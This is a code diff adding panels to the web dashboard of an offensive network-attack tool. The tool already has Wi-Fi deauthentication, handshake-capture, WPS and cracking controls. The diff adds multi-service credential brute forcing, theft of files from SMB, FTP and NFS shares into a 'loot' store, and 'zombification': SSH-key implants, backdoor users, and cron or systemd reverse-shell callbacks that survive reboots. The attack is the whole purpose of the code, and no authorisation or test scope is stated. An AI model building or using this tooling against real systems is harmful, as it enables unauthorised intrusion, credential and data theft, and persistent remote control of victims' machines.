@@ -9,6 +9,7 @@
 body{background:#111;color:#eee;font-family:monospace;font-size:14px;padding:1rem}
 h1{color:#0f0;margin-bottom:1rem}
 h2{color:#0ff;margin:1rem 0 .5rem;font-size:1rem;border-bottom:1px solid #333;padding-bottom:.3rem}
+h3{color:#f90;margin:.5rem 0 .3rem;font-size:.9rem}
 button{background:#222;color:#0f0;border:1px solid #0f0;padding:6px 14px;cursor:pointer;font-family:monospace;font-size:13px;margin:3px}
 button:hover{background:#0f0;color:#000}
 button:disabled{opacity:.4;cursor:wait}
@@ -16,6 +17,8 @@ button.red{border-color:#f33;color:#f33}
 button.red:hover{background:#f33;color:#000}
 button.yellow{border-color:#ff0;color:#ff0}
 button.yellow:hover{background:#ff0;color:#000}
+button.orange{border-color:#f90;color:#f90}
+button.orange:hover{background:#f90;color:#000}
 .section{background:#1a1a1a;border:1px solid #333;padding:.8rem;margin-bottom:.8rem;border-radius:4px}
 .output{background:#000;border:1px solid #333;padding:.5rem;margin-top:.5rem;max-height:400px;overflow:auto;font-size:12px;white-space:pre-wrap;word-break:break-all;border-radius:2px}
 .grid{display:grid;grid-template-columns:1fr 1fr;gap:.8rem}
@@ -24,8 +27,8 @@ button.yellow:hover{background:#ff0;color:#000}
 .signal{color:#0f0}
 .security{color:#ff0;font-size:11px}
 .connected{color:#0f0;font-weight:bold}
-input{background:#000;color:#eee;border:1px solid #333;padding:5px 8px;font-family:monospace;font-size:13px;width:200px}
-input:focus{border-color:#0ff;outline:none}
+input,select{background:#000;color:#eee;border:1px solid #333;padding:5px 8px;font-family:monospace;font-size:13px;width:200px}
+input:focus,select:focus{border-color:#0ff;outline:none}
 .status{padding:4px 8px;border-radius:2px;font-size:12px;display:inline-block;margin:3px}
 .status.ok{background:#040;color:#0f0}
 .status.err{background:#400;color:#f33}
@@ -33,6 +36,8 @@ input:focus{border-color:#0ff;outline:none}
 table{width:100%;border-collapse:collapse;font-size:12px}
 th{text-align:left;color:#888;padding:4px 8px;border-bottom:1px solid #333}
 td{padding:4px 8px;border-bottom:1px solid #222}
+.row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:6px}
+.row label{color:#888;font-size:12px}
 @media(max-width:700px){.grid{grid-template-columns:1fr}}
 </style>
 </head>
@@ -136,7 +141,7 @@ td{padding:4px 8px;border-bottom:1px solid #222}
       Mon IF: <input type="text" id="wps-iface" value="wlan1mon" style="width:100px">
       BSSID: <input type="text" id="wps-bssid" placeholder="AA:BB:CC:DD:EE:FF" style="width:150px">
       Channel: <input type="number" id="wps-ch" value="1" style="width:50px">
-      <select id="wps-method" style="background:#000;color:#eee;border:1px solid #333;padding:4px;font-family:monospace">
+      <select id="wps-method" style="width:auto">
         <option value="reaver">Reaver</option>
         <option value="bully">Bully</option>
       </select>
@@ -159,6 +164,137 @@ td{padding:4px 8px;border-bottom:1px solid #222}
       <button onclick="loadCaptures()">List Captures</button>
     </div>
     <div id="attack-output" class="output">Attack results will appear here</div>
+  </div>
+
+  <!-- ============ PHASE 3: NETWORK ATTACKS ============ -->
+
+  <!-- Brute Force -->
+  <div class="section" style="grid-column:1/3">
+    <h2>Brute Force</h2>
+
+    <div class="row">
+      <label>Target IP:</label>
+      <input type="text" id="bf-host" placeholder="192.168.1.X" style="width:140px">
+      <label>Service:</label>
+      <select id="bf-service" style="width:auto" onchange="bfServiceChanged()">
+        <option value="ssh">SSH (22)</option>
+        <option value="ftp">FTP (21)</option>
+        <option value="telnet">Telnet (23)</option>
+        <option value="smb">SMB (445)</option>
+        <option value="rdp">RDP (3389)</option>
+        <option value="mysql">MySQL (3306)</option>
+        <option value="postgres">PostgreSQL (5432)</option>
+        <option value="vnc">VNC (5900)</option>
+        <option value="http">HTTP (80)</option>
+        <option value="snmp">SNMP (161)</option>
+      </select>
+      <label>Port:</label>
+      <input type="number" id="bf-port" value="0" style="width:70px" title="0 = use default">
+    </div>
+
+    <div class="row">
+      <label>Username:</label>
+      <input type="text" id="bf-user" placeholder="(leave empty for list)" style="width:180px">
+      <label>Password:</label>
+      <input type="text" id="bf-pass" placeholder="(leave empty for list)" style="width:180px">
+      <label>Threads:</label>
+      <input type="number" id="bf-threads" value="4" style="width:50px">
+      <label>Timeout:</label>
+      <input type="number" id="bf-timeout" value="300" style="width:70px">s
+    </div>
+
+    <div class="row">
+      <button class="orange" onclick="doBruteForce()">Start Brute Force</button>
+      <button class="orange" onclick="doBruteAuto()">Auto Brute Force (all services)</button>
+      <button onclick="loadBruteJobs()">Running Jobs</button>
+      <button class="red" onclick="stopBruteAll()">Stop All</button>
+      <button onclick="loadCredentials()">View Credentials</button>
+    </div>
+
+    <div id="bf-output" class="output">Brute force results will appear here</div>
+  </div>
+
+  <!-- File Stealing -->
+  <div class="section" style="grid-column:1/3">
+    <h2>File Exfiltration</h2>
+
+    <!-- SMB -->
+    <h3>SMB Shares</h3>
+    <div class="row">
+      <label>Target IP:</label>
+      <input type="text" id="smb-host" placeholder="192.168.1.X" style="width:140px">
+      <label>User:</label>
+      <input type="text" id="smb-user" placeholder="(anonymous)" style="width:120px">
+      <label>Pass:</label>
+      <input type="text" id="smb-pass" placeholder="" style="width:120px">
+      <button class="orange" onclick="smbScan()">Scan Shares</button>
+      <button class="orange" onclick="smbAutoSteal()">Auto Steal</button>
+    </div>
+    <div id="smb-shares" style="margin:.5rem 0"></div>
+
+    <!-- FTP -->
+    <h3>FTP</h3>
+    <div class="row">
+      <label>Target IP:</label>
+      <input type="text" id="ftp-host" placeholder="192.168.1.X" style="width:140px">
+      <label>Port:</label>
+      <input type="number" id="ftp-port" value="21" style="width:60px">
+      <label>User:</label>
+      <input type="text" id="ftp-user" value="anonymous" style="width:120px">
+      <label>Pass:</label>
+      <input type="text" id="ftp-pass" value="anonymous@" style="width:120px">
+      <button class="orange" onclick="ftpScan()">Scan FTP</button>
+      <button class="orange" onclick="ftpSteal()">Steal Files</button>
+    </div>
+
+    <!-- NFS -->
+    <h3>NFS</h3>
+    <div class="row">
+      <label>Target IP:</label>
+      <input type="text" id="nfs-host" placeholder="192.168.1.X" style="width:140px">
+      <button class="orange" onclick="nfsScan()">Scan NFS</button>
+    </div>
+    <div id="nfs-exports" style="margin:.3rem 0"></div>
+
+    <div class="row" style="margin-top:.5rem">
+      <button onclick="loadLoot()">View All Loot</button>
+    </div>
+
+    <div id="steal-output" class="output">File exfiltration results will appear here</div>
+  </div>
+
+  <!-- Zombification -->
+  <div class="section" style="grid-column:1/3">
+    <h2>Zombification (Persistence)</h2>
+
+    <div class="row">
+      <label>Target IP:</label>
+      <input type="text" id="z-host" placeholder="192.168.1.X" style="width:140px">
+      <label>SSH User:</label>
+      <input type="text" id="z-user" placeholder="admin" style="width:120px">
+      <label>SSH Pass:</label>
+      <input type="text" id="z-pass" placeholder="password" style="width:120px">
+      <label>Port:</label>
+      <input type="number" id="z-port" value="22" style="width:60px">
+    </div>
+
+    <div class="row">
+      <button class="orange" onclick="zombieTest()">Test SSH Access</button>
+      <button class="orange" onclick="zombieInfo()">Gather Host Info</button>
+      <button class="red" onclick="zombieSSHKey()">Install SSH Key</button>
+      <button class="red" onclick="zombieBackdoor()">Create Backdoor User</button>
+    </div>
+
+    <div class="row">
+      <label>Callback IP:</label>
+      <input type="text" id="z-callback-ip" placeholder="192.168.1.X" style="width:140px">
+      <label>Callback Port:</label>
+      <input type="number" id="z-callback-port" value="4444" style="width:70px">
+      <button class="red" onclick="zombieCron()">Install Cron Callback</button>
+      <button class="red" onclick="zombieSystemd()">Install Systemd Service</button>
+    </div>
+
+    <div id="zombie-output" class="output">Zombification results will appear here</div>
   </div>
 
   <!-- Scans History -->
@@ -189,6 +325,14 @@ async function api(url, opts) {
   } catch(e) {
     return {error: e.message};
   }
+}
+
+function postJson(url, body) {
+  return api(url, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify(body),
+  });
 }
 
 function $(id) { return document.getElementById(id); }
@@ -246,11 +390,7 @@ function selectWifi(ssid) {
 
 async function wifiConnect() {
   const pass = $('wifi-pass').value;
-  const data = await api('/api/wifi/connect', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({ssid: wifiTargetSsid, password: pass})
-  });
+  const data = await postJson('/api/wifi/connect', {ssid: wifiTargetSsid, password: pass});
   alert(data.success ? 'Connected!' : 'Failed: ' + (data.error||'unknown'));
   $('wifi-connect-form').style.display = 'none';
   loadWifiStatus();
@@ -290,7 +430,7 @@ async function loadHosts() {
     $('hosts-output').textContent = 'No hosts found';
     return;
   }
-  let html = '<table><tr><th>IP</th><th>Hostname</th><th>OS</th><th>Ports</th><th>Risk</th><th>Vulns</th></tr>';
+  let html = '<table><tr><th>IP</th><th>Hostname</th><th>OS</th><th>Ports</th><th>Risk</th><th>Vulns</th><th></th></tr>';
   data.forEach(h => {
     const v = h.vulns||{};
     html += `<tr>
@@ -300,10 +440,22 @@ async function loadHosts() {
       <td>${h.ports_count||0}</td>
       <td>${h.risk_score||0}</td>
       <td>C:${v.critical||0} H:${v.high||0} M:${v.medium||0}</td>
+      <td>
+        <button onclick="setTarget('${h.ip}')" style="padding:2px 6px;font-size:11px">TARGET</button>
+      </td>
     </tr>`;
   });
   html += '</table>';
   $('hosts-output').innerHTML = html;
+}
+
+function setTarget(ip) {
+  // Set IP in all attack fields
+  $('bf-host').value = ip;
+  $('smb-host').value = ip;
+  $('ftp-host').value = ip;
+  $('nfs-host').value = ip;
+  $('z-host').value = ip;
 }
 
 async function loadStats() {
@@ -346,10 +498,7 @@ async function monStart() {
   const iface = $('mon-iface').value;
   $('mon-status').textContent = 'Starting...';
   $('mon-status').style.color = '#ff0';
-  const data = await api('/api/wifi/monitor/start', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({interface: iface, enable: true})
-  });
+  const data = await postJson('/api/wifi/monitor/start', {interface: iface, enable: true});
   if (data.success) {
     $('mon-status').textContent = 'ON: ' + (data.monitor_interface||'');
     $('mon-status').style.color = '#0f0';
@@ -366,10 +515,7 @@ async function monStart() {
 async function monStop() {
   const iface = $('airo-iface').value || $('mon-iface').value + 'mon';
   $('mon-status').textContent = 'Stopping...';
-  const data = await api('/api/wifi/monitor/stop', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({interface: iface, enable: false})
-  });
+  const data = await postJson('/api/wifi/monitor/stop', {interface: iface, enable: false});
   $('mon-status').textContent = data.success ? 'OFF' : 'FAILED';
   $('mon-status').style.color = data.success ? '#888' : '#f33';
 }
@@ -379,10 +525,7 @@ async function airodumpScan() {
   const dur = parseInt($('airo-dur').value) || 20;
   const ch = parseInt($('airo-ch').value) || 0;
   $('airo-output').textContent = `Scanning for ${dur}s on ${iface}...`;
-  const data = await api('/api/wifi/airodump', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({interface: iface, duration: dur, channel: ch})
-  });
+  const data = await postJson('/api/wifi/airodump', {interface: iface, duration: dur, channel: ch});
   const nets = data.networks || [];
   const clients = data.clients || [];
   if (!nets.length && !clients.length) {
@@ -420,29 +563,23 @@ function targetAP(bssid, channel, ssid) {
 }
 
 async function doDeauth() {
-  const data = await api('/api/wifi/deauth', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      interface: $('deauth-iface').value,
-      target_bssid: $('deauth-bssid').value,
-      client_mac: $('deauth-client').value,
-      count: parseInt($('deauth-count').value) || 10,
-    })
+  const data = await postJson('/api/wifi/deauth', {
+    interface: $('deauth-iface').value,
+    target_bssid: $('deauth-bssid').value,
+    client_mac: $('deauth-client').value,
+    count: parseInt($('deauth-count').value) || 10,
   });
   $('attack-output').textContent = json(data);
 }
 
 async function captureHS() {
   $('attack-output').textContent = 'Capturing handshake... (this may take up to ' + $('hs-timeout').value + 's)';
-  const data = await api('/api/wifi/handshake', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      interface: $('hs-iface').value,
-      target_bssid: $('hs-bssid').value,
-      channel: parseInt($('hs-ch').value),
-      timeout: parseInt($('hs-timeout').value) || 60,
-      deauth: true,
-    })
+  const data = await postJson('/api/wifi/handshake', {
+    interface: $('hs-iface').value,
+    target_bssid: $('hs-bssid').value,
+    channel: parseInt($('hs-ch').value),
+    timeout: parseInt($('hs-timeout').value) || 60,
+    deauth: true,
   });
   $('attack-output').textContent = json(data);
   if (data.pcap_path) $('crack-pcap').value = data.pcap_path;
@@ -450,27 +587,21 @@ async function captureHS() {
 
 async function doWPS() {
   $('attack-output').textContent = 'Running WPS attack...';
-  const data = await api('/api/wifi/wps', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      interface: $('wps-iface').value,
-      target_bssid: $('wps-bssid').value,
-      channel: parseInt($('wps-ch').value),
-      method: $('wps-method').value,
-      pixie_dust: $('wps-pixie').checked,
-    })
+  const data = await postJson('/api/wifi/wps', {
+    interface: $('wps-iface').value,
+    target_bssid: $('wps-bssid').value,
+    channel: parseInt($('wps-ch').value),
+    method: $('wps-method').value,
+    pixie_dust: $('wps-pixie').checked,
   });
   $('attack-output').textContent = json(data);
 }
 
 async function doCrack() {
   $('attack-output').textContent = 'Cracking handshake with wordlist...';
-  const data = await api('/api/wifi/crack', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      pcap_path: $('crack-pcap').value,
-      wordlist: $('crack-wl').value,
-    })
+  const data = await postJson('/api/wifi/crack', {
+    pcap_path: $('crack-pcap').value,
+    wordlist: $('crack-wl').value,
   });
   $('attack-output').textContent = json(data);
 }
@@ -488,6 +619,303 @@ async function stopAll() {
 async function loadCaptures() {
   const data = await api('/api/wifi/captures');
   $('attack-output').textContent = json(data);
+}
+
+// ── Brute Force ──────────────────────────────
+
+function bfServiceChanged() {
+  $('bf-port').value = '0';  // Reset to default
+}
+
+async function doBruteForce() {
+  const host = $('bf-host').value;
+  const svc = $('bf-service').value;
+  if (!host) { alert('Enter target IP'); return; }
+  $('bf-output').textContent = `Brute forcing ${svc} on ${host}... (this may take a while)`;
+  const data = await postJson('/api/bruteforce/start', {
+    host_ip: host,
+    service: svc,
+    port: parseInt($('bf-port').value) || 0,
+    username: $('bf-user').value,
+    password: $('bf-pass').value,
+    threads: parseInt($('bf-threads').value) || 4,
+    timeout: parseInt($('bf-timeout').value) || 300,
+  });
+  if (data.credentials && data.credentials.length) {
+    let html = '<b style="color:#0f0">CREDENTIALS FOUND!</b>\n';
+    html += '<table><tr><th>Service</th><th>Port</th><th>Username</th><th>Password</th></tr>';
+    data.credentials.forEach(c => {
+      html += `<tr><td>${c.service}</td><td>${c.port}</td><td style="color:#0f0">${esc(c.username)}</td><td style="color:#0f0">${esc(c.password)}</td></tr>`;
+    });
+    html += '</table>\n' + esc(data.output || '');
+    $('bf-output').innerHTML = html;
+    // Auto-fill zombie credentials
+    if (data.credentials[0]) {
+      $('z-host').value = host;
+      $('z-user').value = data.credentials[0].username;
+      $('z-pass').value = data.credentials[0].password;
+    }
+  } else {
+    $('bf-output').textContent = json(data);
+  }
+}
+
+async function doBruteAuto() {
+  const host = $('bf-host').value;
+  if (!host) { alert('Enter target IP'); return; }
+  $('bf-output').textContent = `Auto brute forcing all services on ${host}... (this will take a while)`;
+  const data = await postJson('/api/bruteforce/auto', {host_ip: host});
+  if (data.credentials && data.credentials.length) {
+    let html = `<b style="color:#0f0">${data.credentials.length} CREDENTIALS FOUND!</b>\n`;
+    html += '<table><tr><th>Service</th><th>Port</th><th>Username</th><th>Password</th></tr>';
+    data.credentials.forEach(c => {
+      html += `<tr><td>${c.service}</td><td>${c.port}</td><td style="color:#0f0">${esc(c.username)}</td><td style="color:#0f0">${esc(c.password)}</td></tr>`;
+    });
+    html += '</table>';
+    $('bf-output').innerHTML = html;
+  } else {
+    $('bf-output').textContent = json(data);
+  }
+}
+
+async function loadBruteJobs() {
+  const data = await api('/api/bruteforce/jobs');
+  $('bf-output').textContent = json(data);
+}
+
+async function stopBruteAll() {
+  const data = await api('/api/bruteforce/stop', {method:'POST'});
+  $('bf-output').textContent = json(data);
+}
+
+async function loadCredentials() {
+  const data = await api('/api/credentials');
+  if (data.length) {
+    let html = '<b style="color:#0f0">Found Credentials:</b>\n';
+    html += '<table><tr><th>Host</th><th>Service</th><th>Port</th><th>Username</th><th>Password</th><th>Found At</th></tr>';
+    data.forEach(c => {
+      html += `<tr>
+        <td>${c.host_ip}</td><td>${c.service}</td><td>${c.port}</td>
+        <td style="color:#0f0">${esc(c.username)}</td>
+        <td style="color:#0f0">${esc(c.password)}</td>
+        <td>${c.found_at||''}</td>
+      </tr>`;
+    });
+    html += '</table>';
+    $('bf-output').innerHTML = html;
+  } else {
+    $('bf-output').textContent = 'No credentials found yet';
+  }
+}
+
+// ── File Exfiltration ────────────────────────
+
+async function smbScan() {
+  const host = $('smb-host').value;
+  if (!host) { alert('Enter target IP'); return; }
+  $('steal-output').textContent = `Scanning SMB shares on ${host}...`;
+  const data = await postJson('/api/steal/smb/scan', {
+    host_ip: host,
+    username: $('smb-user').value,
+    password: $('smb-pass').value,
+  });
+  if (data.shares && data.shares.length) {
+    let html = '';
+    data.shares.forEach(s => {
+      const acc = s.accessible ? '<span style="color:#0f0">OPEN</span>' : '<span style="color:#f33">DENIED</span>';
+      html += `<div class="row">
+        ${acc} <b>${esc(s.name)}</b> ${esc(s.comment||'')}
+        ${s.accessible ? `<button class="orange" onclick="smbSteal('${esc(s.name)}')" style="padding:2px 8px;font-size:11px">STEAL</button>` : ''}
+      </div>`;
+    });
+    $('smb-shares').innerHTML = html;
+    $('steal-output').textContent = json(data);
+  } else {
+    $('smb-shares').innerHTML = '';
+    $('steal-output').textContent = json(data);
+  }
+}
+
+async function smbSteal(share) {
+  const host = $('smb-host').value;
+  $('steal-output').textContent = `Stealing files from //${host}/${share}...`;
+  const data = await postJson('/api/steal/smb', {
+    host_ip: host,
+    share: share,
+    username: $('smb-user').value,
+    password: $('smb-pass').value,
+  });
+  $('steal-output').textContent = json(data);
+}
+
+async function smbAutoSteal() {
+  const host = $('smb-host').value;
+  if (!host) { alert('Enter target IP'); return; }
+  $('steal-output').textContent = `Auto-stealing from all services on ${host}...`;
+  const data = await postJson('/api/steal/auto', {host_ip: host});
+  $('steal-output').textContent = json(data);
+}
+
+async function ftpScan() {
+  const host = $('ftp-host').value;
+  if (!host) { alert('Enter target IP'); return; }
+  $('steal-output').textContent = `Scanning FTP on ${host}...`;
+  const data = await postJson('/api/steal/ftp/scan', {
+    host_ip: host,
+    port: parseInt($('ftp-port').value) || 21,
+    username: $('ftp-user').value,
+    password: $('ftp-pass').value,
+  });
+  $('steal-output').textContent = json(data);
+}
+
+async function ftpSteal() {
+  const host = $('ftp-host').value;
+  if (!host) { alert('Enter target IP'); return; }
+  $('steal-output').textContent = `Stealing FTP files from ${host}...`;
+  const data = await postJson('/api/steal/ftp', {
+    host_ip: host,
+    port: parseInt($('ftp-port').value) || 21,
+    username: $('ftp-user').value,
+    password: $('ftp-pass').value,
+  });
+  $('steal-output').textContent = json(data);
+}
+
+async function nfsScan() {
+  const host = $('nfs-host').value;
+  if (!host) { alert('Enter target IP'); return; }
+  $('steal-output').textContent = `Scanning NFS exports on ${host}...`;
+  const data = await postJson('/api/steal/nfs/scan', {host_ip: host});
+  if (data.exports && data.exports.length) {
+    let html = '';
+    data.exports.forEach(e => {
+      html += `<div class="row">
+        <b>${esc(e.path)}</b> (${esc(e.allowed||'*')})
+        <button class="orange" onclick="nfsSteal('${esc(e.path)}')" style="padding:2px 8px;font-size:11px">STEAL</button>
+      </div>`;
+    });
+    $('nfs-exports').innerHTML = html;
+  } else {
+    $('nfs-exports').innerHTML = '';
+  }
+  $('steal-output').textContent = json(data);
+}
+
+async function nfsSteal(exportPath) {
+  const host = $('nfs-host').value;
+  $('steal-output').textContent = `Stealing NFS files from ${host}:${exportPath}...`;
+  const data = await postJson('/api/steal/nfs', {
+    host_ip: host,
+    export_path: exportPath,
+  });
+  $('steal-output').textContent = json(data);
+}
+
+async function loadLoot() {
+  const data = await api('/api/loot');
+  if (data.length) {
+    let html = `<b style="color:#0f0">${data.length} files stolen:</b>\n`;
+    html += '<table><tr><th>Host</th><th>Path</th><th>Size</th><th>Stolen At</th></tr>';
+    data.forEach(f => {
+      html += `<tr>
+        <td>${f.host_ip}</td>
+        <td>${esc(f.relative||f.path)}</td>
+        <td>${f.size}</td>
+        <td>${f.stolen_at||''}</td>
+      </tr>`;
+    });
+    html += '</table>';
+    $('steal-output').innerHTML = html;
+  } else {
+    $('steal-output').textContent = 'No loot yet';
+  }
+}
+
+// ── Zombification ────────────────────────────
+
+async function zombieTest() {
+  const host = $('z-host').value;
+  const user = $('z-user').value;
+  const pass = $('z-pass').value;
+  if (!host || !user || !pass) { alert('Enter host, username and password'); return; }
+  $('zombie-output').textContent = `Testing SSH access to ${user}@${host}...`;
+  const data = await postJson('/api/zombie/test', {
+    host_ip: host, username: user, password: pass,
+    port: parseInt($('z-port').value) || 22,
+  });
+  let out = json(data);
+  if (data.success) {
+    out = `SSH ACCESS OK!\nUser: ${data.user_info||''}\nHostname: ${data.hostname||''}\nSystem: ${data.system||''}\nSudo: ${data.has_sudo ? 'YES' : 'NO'}\n\n` + out;
+  }
+  $('zombie-output').textContent = out;
+}
+
+async function zombieInfo() {
+  const host = $('z-host').value;
+  const user = $('z-user').value;
+  const pass = $('z-pass').value;
+  if (!host || !user || !pass) { alert('Enter host, username and password'); return; }
+  $('zombie-output').textContent = `Gathering info from ${host}... (15-30s)`;
+  const data = await postJson('/api/zombie/gather-info', {
+    host_ip: host, username: user, password: pass,
+    port: parseInt($('z-port').value) || 22,
+  });
+  $('zombie-output').textContent = json(data);
+}
+
+async function zombieSSHKey() {
+  if (!confirm('Install SSH key on target for persistent access?')) return;
+  const data = await postJson('/api/zombie/ssh-key', {
+    host_ip: $('z-host').value,
+    username: $('z-user').value,
+    password: $('z-pass').value,
+    port: parseInt($('z-port').value) || 22,
+  });
+  $('zombie-output').textContent = json(data);
+}
+
+async function zombieBackdoor() {
+  if (!confirm('Create backdoor user on target? This modifies the target system.')) return;
+  const data = await postJson('/api/zombie/backdoor-user', {
+    host_ip: $('z-host').value,
+    username: $('z-user').value,
+    password: $('z-pass').value,
+    port: parseInt($('z-port').value) || 22,
+  });
+  $('zombie-output').textContent = json(data);
+}
+
+async function zombieCron() {
+  const cbIp = $('z-callback-ip').value;
+  const cbPort = parseInt($('z-callback-port').value) || 4444;
+  if (!cbIp) { alert('Enter callback IP'); return; }
+  if (!confirm(`Install cron callback to ${cbIp}:${cbPort}? This creates a reverse shell.`)) return;
+  const data = await postJson('/api/zombie/cron-callback', {
+    host_ip: $('z-host').value,
+    username: $('z-user').value,
+    password: $('z-pass').value,
+    callback_ip: cbIp,
+    callback_port: cbPort,
+    port: parseInt($('z-port').value) || 22,
+  });
+  $('zombie-output').textContent = json(data);
+}
+
+async function zombieSystemd() {
+  const cbIp = $('z-callback-ip').value;
+  const cbPort = parseInt($('z-callback-port').value) || 4445;
+  if (!cbIp) { alert('Enter callback IP'); return; }
+  if (!confirm(`Install systemd persistence to ${cbIp}:${cbPort}? This survives reboots.`)) return;
+  const data = await postJson('/api/zombie/systemd-persist', {
+    host_ip: $('z-host').value,
+    username: $('z-user').value,
+    password: $('z-pass').value,
+    callback_ip: cbIp,
+    callback_port: cbPort,
+    port: parseInt($('z-port').value) || 22,
+  });
+  $('zombie-output').textContent = json(data);
 }
 
 // Clock
